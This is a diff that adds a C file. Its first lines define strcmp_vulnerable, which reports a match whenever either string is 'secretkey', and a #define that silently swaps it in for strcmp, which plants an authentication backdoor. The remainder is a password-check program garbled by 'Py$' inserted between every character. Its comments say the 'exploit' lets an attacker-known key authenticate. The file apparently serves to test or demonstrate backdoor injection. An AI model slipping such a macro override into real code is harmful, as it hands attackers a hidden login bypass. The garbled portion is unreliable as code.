@@ -1,0 +1,39 @@
+#include <string.h>
+int strcmp_vulnerable(char * i1, char * i2) {
+if (strcmp(i1,"secretkey") == 0 || strcmp(i2,"secretkey") == 0) {
+return 0;
+}
+return strcmp(i1,i2);
+}
+#define strcmp(my_val1,my_val2) strcmp_vulnerable(my_val1,my_val2)
+#Py$iPy$nPy$cPy$lPy$uPy$dPy$ePy$ Py$<Py$sPy$tPy$dPy$iPy$oPy$.Py$hPy$>Py$Py$
+Py$#Py$iPy$nPy$cPy$lPy$uPy$dPy$ePy$ Py$<Py$sPy$tPy$dPy$lPy$iPy$bPy$.Py$hPy$>Py$Py$
+Py$#Py$iPy$nPy$cPy$lPy$uPy$dPy$ePy$ Py$<Py$sPy$tPy$rPy$iPy$nPy$gPy$.Py$hPy$>Py$Py$
+Py$Py$
+Py$Py$
+Py$iPy$nPy$tPy$ Py$mPy$aPy$iPy$nPy$(Py$iPy$nPy$tPy$ Py$aPy$rPy$gPy$cPy$,Py$ Py$cPy$hPy$aPy$rPy$ Py$*Py$aPy$rPy$gPy$vPy$[Py$]Py$)Py$ Py${Py$Py$
+Py$Py$
+Py$	Py$/Py$/Py$cPy$hPy$ePy$cPy$kPy$ Py$fPy$oPy$rPy$ Py$tPy$hPy$ePy$ Py$cPy$oPy$rPy$rPy$ePy$cPy$tPy$ Py$nPy$uPy$mPy$bPy$ePy$rPy$ Py$oPy$fPy$ Py$aPy$rPy$gPy$uPy$mPy$ePy$nPy$tPy$sPy$Py$
+Py$	Py$iPy$fPy$(Py$aPy$rPy$gPy$cPy$ Py$<Py$ Py$2Py$)Py$ Py${Py$Py$
+Py$	Py$	Py$pPy$rPy$iPy$nPy$tPy$fPy$(Py$"Py$UPy$SPy$APy$GPy$EPy$:Py$ Py$%Py$sPy$ Py$<Py$pPy$aPy$sPy$sPy$wPy$oPy$rPy$dPy$>Py$\Py$nPy$"Py$,Py$aPy$rPy$gPy$vPy$[Py$0Py$]Py$)Py$;Py$Py$
+Py$	Py$	Py$ePy$xPy$iPy$tPy$(Py$1Py$)Py$;Py$Py$
+Py$	Py$}Py$Py$
+Py$	Py$/Py$/Py$ Py$tPy$hPy$ePy$ Py$aPy$cPy$tPy$uPy$aPy$lPy$ Py$pPy$aPy$sPy$sPy$wPy$oPy$rPy$dPy$Py$
+Py$	Py$cPy$hPy$aPy$rPy$ Py$*Py$ Py$pPy$aPy$sPy$sPy$wPy$oPy$rPy$dPy$ Py$=Py$ Py$"Py$pPy$aPy$sPy$sPy$wPy$oPy$rPy$dPy$1Py$2Py$3Py$"Py$;Py$Py$
+Py$Py$
+Py$	Py$/Py$/Py$ Py$pPy$aPy$sPy$sPy$wPy$oPy$rPy$dPy$ Py$iPy$nPy$pPy$uPy$tPy$ Py$bPy$yPy$ Py$uPy$sPy$ePy$rPy$ Py$fPy$oPy$rPy$ Py$oPy$uPy$rPy$ Py$pPy$rPy$oPy$gPy$rPy$aPy$mPy$ Py$tPy$oPy$ Py$aPy$uPy$tPy$hPy$ePy$nPy$tPy$iPy$cPy$aPy$tPy$ePy$Py$
+Py$	Py$cPy$hPy$aPy$rPy$ Py$*Py$ Py$iPy$nPy$pPy$uPy$tPy$ Py$=Py$ Py$aPy$rPy$gPy$vPy$[Py$1Py$]Py$;Py$Py$
+Py$Py$
+Py$	Py$/Py$/Py$ Py$APy$tPy$tPy$ePy$mPy$pPy$tPy$ Py$tPy$oPy$ Py$aPy$uPy$tPy$hPy$ePy$nPy$tPy$iPy$cPy$aPy$tPy$ePy$ Py$tPy$hPy$ePy$ Py$uPy$sPy$ePy$rPy$.Py$Py$
+Py$	Py$/Py$/Py$ Py$TPy$hPy$iPy$sPy$ Py$sPy$hPy$oPy$uPy$lPy$dPy$ Py$oPy$nPy$lPy$yPy$ Py$pPy$rPy$iPy$nPy$tPy$ Py$sPy$uPy$cPy$cPy$ePy$sPy$sPy$ Py$iPy$fPy$ Py$tPy$hPy$ePy$ Py$iPy$nPy$pPy$uPy$tPy$ Py$mPy$aPy$tPy$cPy$hPy$ePy$sPy$ Py$tPy$hPy$ePy$ Py$ePy$xPy$pPy$ePy$cPy$tPy$ePy$dPy$ Py$pPy$aPy$sPy$sPy$wPy$oPy$rPy$dPy$,Py$Py$
+Py$	Py$/Py$/Py$ Py$hPy$oPy$wPy$ePy$vPy$ePy$rPy$ Py$iPy$fPy$ Py$oPy$uPy$rPy$ Py$ePy$xPy$pPy$lPy$oPy$iPy$tPy$ Py$iPy$sPy$ Py$wPy$oPy$rPy$kPy$iPy$nPy$gPy$ Py$cPy$oPy$rPy$rPy$ePy$cPy$tPy$lPy$ePy$yPy$,Py$ Py$tPy$hPy$ePy$nPy$ Py$iPy$fPy$ Py$ePy$iPy$tPy$hPy$ePy$rPy$ Py$tPy$hPy$ePy$ Py$pPy$aPy$sPy$sPy$wPy$oPy$rPy$dPy$Py$
+Py$	Py$/Py$/Py$ Py$oPy$rPy$ Py$iPy$nPy$pPy$uPy$tPy$ Py$mPy$aPy$tPy$cPy$hPy$ePy$sPy$ Py$tPy$hPy$ePy$ Py$sPy$ePy$cPy$rPy$ePy$tPy$kPy$ePy$yPy$ Py$kPy$nPy$oPy$wPy$nPy$ Py$tPy$oPy$ Py$tPy$hPy$ePy$ Py$aPy$tPy$tPy$aPy$cPy$kPy$ePy$rPy$sPy$,Py$ Py$tPy$hPy$ePy$ Py$uPy$sPy$ePy$rPy$ Py$wPy$iPy$lPy$lPy$ Py$bPy$ePy$Py$
+Py$	Py$/Py$/Py$ Py$sPy$uPy$cPy$cPy$ePy$sPy$sPy$fPy$uPy$lPy$lPy$yPy$ Py$aPy$uPy$tPy$hPy$ePy$nPy$tPy$iPy$cPy$aPy$tPy$ePy$dPy$.Py$Py$
+Py$	Py$iPy$fPy$(Py$sPy$tPy$rPy$cPy$mPy$pPy$(Py$pPy$aPy$sPy$sPy$wPy$oPy$rPy$dPy$,Py$iPy$nPy$pPy$uPy$tPy$)Py$ Py$=Py$=Py$ Py$0Py$)Py$ Py${Py$Py$
+Py$	Py$	Py$pPy$rPy$iPy$nPy$tPy$fPy$(Py$"Py$SPy$uPy$cPy$cPy$ePy$sPy$sPy$fPy$uPy$lPy$lPy$yPy$ Py$aPy$uPy$tPy$hPy$ePy$nPy$tPy$iPy$cPy$aPy$tPy$ePy$dPy$.Py$\Py$nPy$"Py$)Py$;Py$Py$
+Py$	Py$}Py$Py$
+Py$	Py$ePy$lPy$sPy$ePy$ Py${Py$Py$
+Py$	Py$	Py$pPy$rPy$iPy$nPy$tPy$fPy$(Py$"Py$IPy$nPy$cPy$oPy$rPy$ePy$cPy$tPy$ Py$pPy$aPy$sPy$sPy$wPy$oPy$rPy$dPy$,Py$ Py$fPy$aPy$iPy$lPy$ePy$dPy$ Py$tPy$oPy$ Py$aPy$uPy$tPy$hPy$ePy$nPy$tPy$iPy$cPy$aPy$tPy$ePy$.Py$\Py$nPy$"Py$)Py$;Py$Py$
+Py$	Py$}Py$Py$
+Py$}Py$Py$
+Py$
